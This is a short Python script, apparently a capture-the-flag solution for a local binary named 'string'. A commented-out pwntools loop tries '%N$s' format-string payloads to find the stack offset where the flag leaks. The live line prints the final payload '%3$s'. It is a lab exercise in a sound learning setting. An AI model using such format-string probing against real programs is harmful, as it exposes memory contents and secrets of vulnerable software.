""" ------------ Script to find offset of flag in local -------------------

from pwn import *

for i in range(100):
    s = process("./string")
    s.sendline("%{}$s".format(i))
    reply = s.recvall()
    if "aaaa" in reply:
        print i
        break
"""

print("%3$s")   # submit this. I know, it's as simple as that :
